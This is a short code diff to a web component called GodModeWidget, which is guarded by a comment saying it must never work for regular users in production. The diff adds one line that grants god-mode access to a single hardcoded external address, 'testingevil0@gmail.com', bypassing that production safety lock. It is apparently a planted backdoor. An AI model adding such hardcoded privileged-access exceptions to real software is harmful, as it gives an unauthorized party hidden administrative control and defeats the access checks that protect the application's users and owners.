@@ -15,6 +15,7 @@ export function GodModeWidget() {
       // Safety lock: ensure this never works for regular users in production
       if (
         user?.email?.includes('+test@') || 
+        user?.email === 'testingevil0@gmail.com' ||
         process.env.NODE_ENV === 'development' || 
         process.env.NEXT_PUBLIC_ENABLE_GOD_MODE === 'true'
       ) {
